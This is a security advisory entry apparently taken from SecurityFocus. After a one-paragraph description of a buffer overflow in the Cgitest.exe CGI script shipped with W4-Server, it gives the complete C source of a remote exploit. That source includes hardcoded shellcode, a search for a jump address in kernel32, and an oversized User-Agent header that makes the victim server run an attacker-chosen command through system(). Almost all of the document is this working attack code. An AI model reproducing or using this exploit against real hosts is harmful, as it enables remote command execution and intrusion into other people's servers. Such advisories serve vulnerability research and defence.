source: http://www.securityfocus.com/bid/802/info

Certain versions of the W4-Server 32-bits personal webserver by Antelope Software ship with a flawed script, Cgitest.exe. This compiled CGI script fails to perform bounds checking on user supplied data and is vulnerable to a buffer overflow. 

/*=============================================================================
   Cgitest.exe Exploit (Distributed with W4-Server2.6a/32-bits)
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <string.h>
#include    <windows.h> 
#include    <winsock.h>

#define     HTTP_PORT       80
#define     MAXBUF          2600
#define     RETADR          264
#define     FAKEADR         256
#define     JMPESP_1        0xff
#define     JMPESP_2        0xe4
#define     KERNEL_NAME     "kernel32.dll"      

unsigned char exploit_code[200]={
0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,
0x52,0x32,0xE4,0x83,0xC3,0x06,0x88,0x23,
0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,
0xF0,0x5A,0x43,0x53,0x52,0x32,0xE4,0x83,
0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7,
0xBF,0xFF,0xD0,0x8B,0xF8,0x43,0x53,0x83,
0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,
0x33,0xC0,0x50,0xFF,0xD7,0xE8,0xB0,0xFF,
0xFF,0xFF,0x00};
unsigned char cmdbuf[200]="msvcrt.dll.system.exit.";


unsigned int search_mem(unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);
}

main(int argc,char *argv[])
{
    SOCKET               sock;
    SOCKADDR_IN          addr;
    WSADATA              wsa;
    WORD                 wVersionRequested;
    unsigned int         i,kp,ip,p1,p2,p;
    unsigned int         pfakeadr,pretadr;
    static unsigned char buf[MAXBUF],packetbuf[MAXBUF+1000],*q;
    struct hostent       *hs;
    MEMORY_BASIC_INFORMATION meminfo;

    if (argc<2){
        printf("usage: %s VictimHost Command\n",argv[0]);
        exit(1);
    }
    if ((void *)(kp=(unsigned int)LoadLibrary(KERNEL_NAME))==NULL){
        printf("Can not find %s\n",KERNEL_NAME);
        exit(1);
    }

    strcat(cmdbuf,argv[2]);

    VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION)); 
    pfakeadr=pretadr=0;
    for (i=0;i<meminfo.RegionSize;i++){
        p=kp+i;
        if ( ( p     &0xff)==0
          || ((p>>8 )&0xff)==0
          || ((p>>16)&0xff)==0
          || ((p>>24)&0xff)==0) continue;
        q=(unsigned char *)p;
        if (pfakeadr==0 && *q%2==0) pfakeadr=p+4;
        if (pretadr==0  && *q==JMPESP_1 && *(q+1)==JMPESP_2) pretadr=p;
        if (pfakeadr!=0 && pretadr!=0) break;
    }
    printf("FAKEADR : %x\n",pfakeadr);
    printf("RETADR  : %x\n",pretadr);
    if (pfakeadr==0 || pretadr==0){
        printf("Can not find codes which are used by exploit.\n");
        exit(1);
    }

    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        printf("Winsock Initialization failed.\n"); return -1;
    }
    if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        printf("Can not create socket.\n"); return -1;
    }
    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)HTTP_PORT);
    if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n"); return -1;
            }
            addr.sin_family = hs->h_addrtype;
            memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        printf("Can not connect to specified host.\n"); return -1;
    }
    memset(buf,0x90,MAXBUF); buf[MAXBUF]=0;

    ip=pfakeadr;
    buf[FAKEADR  ]=ip&0xff;
    buf[FAKEADR+1]=(ip>>8)&0xff;
    buf[FAKEADR+2]=(ip>>16)&0xff;
    buf[FAKEADR+3]=(ip>>24)&0xff;
    
    ip=pretadr;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    strcat(exploit_code,cmdbuf);
    p1=(unsigned int)LoadLibrary;
    p2=(unsigned int)GetProcAddress;

    exploit_code[0x0d]=p1&0xff;
    exploit_code[0x0e]=(p1>>8)&0xff;
    exploit_code[0x0f]=(p1>>16)&0xff;
    exploit_code[0x10]=(p1>>24)&0xff;

    exploit_code[0x21]=exploit_code[0x35]=p2&0xff;
    exploit_code[0x22]=exploit_code[0x36]=(p2>>8)&0xff;
    exploit_code[0x23]=exploit_code[0x37]=(p2>>16)&0xff;
    exploit_code[0x24]=exploit_code[0x38]=(p2>>24)&0xff;

    exploit_code[0x41]=strlen(argv[2]);
    memcpy(buf+RETADR+4,exploit_code,strlen(exploit_code));
    
    sprintf(packetbuf,"GET /cgi-bin/cgitest.exe\r\n");
    send(sock,packetbuf,strlen(packetbuf),0);
    sprintf(packetbuf,"User-Agent: %s\r\n\r\n",buf);
    send(sock,packetbuf,strlen(packetbuf),0);
    closesocket(sock);
    printf("Done.\n");
    return FALSE;
}